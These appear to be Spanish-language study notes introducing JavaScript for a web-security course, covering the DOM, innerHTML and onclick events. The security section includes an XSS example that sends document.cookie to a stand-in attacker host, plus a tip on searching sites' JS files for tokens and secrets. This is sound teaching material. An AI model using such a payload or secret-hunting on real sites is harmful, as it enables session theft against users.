# How Websites Work — Tarea 3: JavaScript

> [!info] Módulo: How Websites Work
> JavaScript es lo que hace que las páginas web "cobren vida". Sin él, todo sería texto estático sin interacción.

---

## ¿Qué es JavaScript?

JavaScript (JS) es uno de los lenguajes de programación más populares del mundo. Su función principal en los sitios web es **controlar el comportamiento** de la página.

Recuerda la analogía de la casa de la Tarea 2:

| Tecnología | Analogía |
|------------|----------|
| HTML | La estructura: paredes, puertas, ventanas |
| CSS | La decoración: pintura, muebles, estética |
| **JavaScript** | **La electricidad: hace que las cosas funcionen e interactúen** |

Sin JavaScript, una página web sería como un libro: puedes leerla, pero no puedes interactuar con ella. JS es lo que permite:

- Que un botón haga algo al hacer clic
- Que aparezcan animaciones
- Que un formulario valide datos antes de enviarlos
- Que el contenido cambie sin recargar la página
- Que aparezcan notificaciones, popups, contadores, etc.

---

## ¿Cómo se incluye JavaScript en una página web?

Hay dos formas de añadir JS a un HTML:

### 1. Directamente dentro del HTML (inline)

```html
<script>
    // El código JavaScript va aquí dentro
    document.getElementById("demo").innerHTML = "Hack the Planet";
</script>
```

### 2. Desde un archivo externo (recomendado)

```html
<script src="/location/of/javascript_file.js"></script>
```

El atributo `src` apunta a un archivo `.js` externo, igual que `src` en las imágenes apunta al archivo de imagen.

> [!tip] ¿Por qué importa esto en seguridad?
> Cuando auditas una web, los archivos `.js` externos son **oro**. Pueden contener:
> - Rutas internas de la API (`/api/v1/users`, `/admin/panel`)
> - Tokens o claves hardcodeadas por error
> - Lógica de validación que puedes saltarte
> - Nombres de variables y funciones que revelan cómo funciona el backend

---

## Cómo JavaScript interactúa con el HTML

JS puede leer y modificar cualquier elemento de la página usando el **DOM** (Document Object Model — el árbol de elementos HTML).

### Seleccionar un elemento por su `id`

```javascript
document.getElementById("demo")
```

Esto le dice a JS: *"encuéntrame el elemento HTML que tiene el id 'demo'"*.

### Cambiar el contenido de un elemento

```javascript
document.getElementById("demo").innerHTML = "Hack the Planet";
```

Desglosado:

| Parte | Significado |
|-------|-------------|
| `document` | Representa toda la página HTML |
| `.getElementById("demo")` | Busca el elemento con `id="demo"` |
| `.innerHTML` | El contenido HTML dentro de ese elemento |
| `= "Hack the Planet"` | Lo reemplaza con ese texto |

**Resultado:** si la página tenía `<p id="demo">Hola</p>`, después de ejecutar ese JS se convierte en `<p id="demo">Hack the Planet</p>` — sin recargar la página.

---

## Eventos — cuando el usuario hace algo

Los **eventos** son acciones del usuario que JS puede detectar y responder. Los más comunes:

| Evento | Cuándo se dispara |
|--------|-------------------|
| `onclick` | Cuando el usuario hace clic en el elemento |
| `onhover` | Cuando el cursor pasa por encima |
| `onload` | Cuando la página termina de cargar |
| `onchange` | Cuando cambia el valor de un campo |
| `onkeypress` | Cuando el usuario presiona una tecla |

### Ejemplo — botón con evento onclick

```html
<button onclick='document.getElementById("demo").innerHTML = "Button Clicked";'>
    Click Me!
</button>
```

Lo que hace paso a paso:
1. El usuario ve un botón que dice **"Click Me!"**
2. Al hacer clic, se dispara el evento `onclick`
3. JS busca el elemento con `id="demo"`
4. Cambia su contenido a **"Button Clicked"**
5. Todo ocurre en tiempo real, sin recargar la página

> [!note] Dos formas de definir eventos
> **Directamente en la etiqueta HTML** (como arriba):
> ```html
> <button onclick="miFuncion()">Click</button>
> ```
> **Dentro de una etiqueta `<script>`** (más ordenado):
> ```html
> <script>
>     document.getElementById("miBoton").onclick = function() {
>         // código aquí
>     }
> </script>
> ```
> Ambas hacen lo mismo. La segunda es más limpia y es la práctica estándar.

---

## Resumen visual del flujo

```
Usuario hace clic en botón
          │
          ▼
    Evento onclick se dispara
          │
          ▼
    JS busca elemento por id
    document.getElementById("demo")
          │
          ▼
    JS modifica el contenido
    .innerHTML = "nuevo texto"
          │
          ▼
    La página se actualiza visualmente
    (sin recargar)
```

---

## 🔐 Relevancia en seguridad web

> [!warning] JavaScript del lado del cliente = código que el usuario puede ver y modificar
> Todo el JS que corre en el navegador es **visible e interceptable**. Esto genera vulnerabilidades comunes:

**1. Validación solo en cliente**
Si un formulario valida datos solo con JS (ejemplo: "este campo no puede estar vacío"), un atacante puede desactivar JS o modificar la petición directamente y saltarse esa validación. La validación real siempre debe estar en el servidor (back end).

**2. XSS — Cross-Site Scripting**
Si una web toma input del usuario y lo inserta directamente en el HTML sin sanitizar, un atacante puede inyectar código JS malicioso:
```html
<!-- Si el sitio inserta lo que escribes sin filtrar: -->
<p>Bienvenido, <script>document.location='http://atacante.com/robar?cookie='+document.cookie</script></p>
```
Esto puede robar cookies de sesión, redirigir usuarios, o ejecutar acciones en nombre de la víctima.

**3. Información expuesta en archivos .js**
Los archivos JavaScript externos frecuentemente contienen rutas de API, lógica de negocio y a veces hasta credenciales hardcodeadas que los desarrolladores olvidaron remover.

> [!tip] Cómo revisar el JS de una web en pentesting
> 1. `F12` → pestaña **Sources** → busca archivos `.js`
> 2. Clic derecho en la página → **View Page Source** → busca etiquetas `<script>`
> 3. Busca palabras clave: `password`, `token`, `key`, `secret`, `api`, `admin`
> 4. Usa la extensión **Wappalyzer** para identificar qué frameworks JS usa el sitio

---

